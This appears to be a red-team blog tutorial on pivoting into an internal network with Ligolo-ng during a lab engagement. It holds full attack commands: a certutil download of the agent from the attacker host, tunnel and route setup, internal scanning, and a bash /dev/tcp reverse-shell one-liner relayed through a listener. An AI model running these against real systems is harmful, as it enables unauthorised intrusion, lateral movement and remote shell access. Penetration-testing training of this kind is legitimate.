---
title: "Ligolo-ng: Pivoting Into Internal Networks the Clean Way"
date: "2025-10-15"
description: "How I used Ligolo-ng to tunnel into an internal network during a lab engagement — real commands, real output, and why it beats other pivoting tools."
tags: ["red-team", "pivoting", "ligolo", "tunneling", "active-directory"]
---

## Why Ligolo Over Other Tools

When you compromise a machine that sits between two networks — your attacker machine can reach it, but it can reach an internal subnet you can't touch directly. That's the pivoting problem. You need to route traffic through your foothold host into that internal network.

Chisel and proxychains work, but they're slow and clunky for scanning. Ligolo-ng is different. It creates an actual TUN interface on your Kali machine — a virtual network card — and routes traffic through it at the OS level. That means you can run `nmap` directly against internal hosts without proxychains. No speed penalty, no wrapper commands.


## Lab Setup

Two networks in this lab:

- `192.168.100.0/24` — attacker network (Kali can reach this)
- `10.10.1.0/24` — internal network (only reachable through the foothold)

Foothold machine sits on both. It's a Windows box I already had a shell on.


## Step 1 — Get the Binaries

Download both proxy and agent from the Ligolo-ng GitHub releases page. You need:

- `ligolo-ng_proxy` — runs on your Kali machine
- `ligolo-ng_agent.exe` — runs on the Windows foothold

Extract the proxy on Kali:

```bash
tar -xvzf ligolo-ng_proxy_linux_amd64.tar.gz
```

Unzip the agent:

```bash
unzip ligolo-ng_agent_windows_amd64.zip
```


## Step 2 — Transfer the Agent to the Foothold

Host the agent from your Kali machine:

```bash
python3 -m http.server 80
```

Download it on the Windows shell you already have:

```cmd
certutil -urlcache -split -f "http://192.168.100.10/agent.exe" agent.exe
```


## Step 3 — Create the TUN Interface on Kali

This is what makes Ligolo different. You create a virtual network interface that the OS uses for routing:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
ifconfig
```

You should see `ligolo` listed as an interface. It has no IP — that's fine. It's a routing interface, not a host interface.


## Step 4 — Start the Proxy on Kali

```bash
./proxy -selfcert
```

Ligolo generates a self-signed cert and listens on port `11601` by default. Output looks like:

```
INFO[0000] Listening on 0.0.0.0:11601
```


## Step 5 — Connect the Agent from the Foothold

On your Windows shell, run:

```cmd
agent.exe -connect 192.168.100.10:11601 -ignore-cert
```

Back on Kali, your proxy console shows a new session:

```
INFO[0012] Agent connected: user@FOOTHOLD-PC
```


## Step 6 — Start the Session

In the Ligolo proxy console:

```
session
```

Select `1` (your connected agent). You're now controlling the tunnel from the foothold's perspective.


## Step 7 — Enumerate the Internal Network

Before routing anything, you need to know what internal subnet the foothold can reach. Run `ipconfig` through your original shell on the foothold:

```
Ethernet adapter Internal:
   IPv4 Address: 10.10.1.100
   Subnet Mask:  255.255.255.0
```

Two adapters — one on `192.168.100.0/24` (which you knew about) and one on `10.10.1.0/24` (the internal network you couldn't reach). That's your target subnet.


## Step 8 — Add the Route on Kali

Tell your Kali machine to route `10.10.1.0/24` traffic through the Ligolo TUN interface:

```bash
sudo ip route add 10.10.1.0/24 dev ligolo
```

Verify it's there:

```bash
route
```

You should see `10.10.1.0` pointing to `ligolo`.


## Step 9 — Start the Tunnel

In the Ligolo proxy console:

```
start
```

That's it. The tunnel is live. You can now reach `10.10.1.0/24` directly from Kali — no proxychains, no wrappers.

Test it:

```bash
nmap -sT -Pn -n --top-ports 100 10.10.1.200
```

Direct scan. Full speed. No proxychains overhead.


## Catching Reverse Shells From Internal Hosts

Here's the part most Ligolo guides skip. If you want a reverse shell from a host on the internal network (`10.10.1.x`), that host can't reach your Kali directly — it can only reach the foothold.

Ligolo handles this with listeners. You add a listener on the foothold that forwards traffic back to your Kali.

**In the Ligolo proxy console (on your active session):**

```
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

This tells the foothold: anything hitting port `4444` on my interfaces, forward it to `127.0.0.1:4444` — which over the tunnel means your Kali machine.

**Start your netcat listener on Kali:**

```bash
nc -lvnp 4444
```

**Trigger the reverse shell on the internal target, pointing to the foothold's internal IP:**

```bash
bash -i >& /dev/tcp/10.10.1.100/4444 0>&1
```

The internal host connects to the foothold on `4444`. The foothold relays it through the Ligolo tunnel. Your netcat on Kali catches it.

**Manage listeners:**

```
listener_list          # see active listeners
listener_stop --id 0   # stop a specific listener
```


## What's Actually Happening

The reason this works cleanly is the TUN interface. From your OS's perspective, `10.10.1.0/24` is a directly connected network — it just happens to physically exist on the other side of an encrypted tunnel through your foothold. Every tool on Kali treats it like a local network. That's the power of working at the network layer instead of the proxy layer.


## When to Use Ligolo vs Chisel

| Scenario | Use |
|---|---|
| Fast internal network scanning | Ligolo |
| Simple port forward to one service | Chisel |
| Multiple internal hosts to reach | Ligolo |
| Single reverse shell forwarding | Either |
| Need SOCKS proxy for a browser | Chisel |

Ligolo is the better default for engagements. Chisel is useful for quick single-port jobs.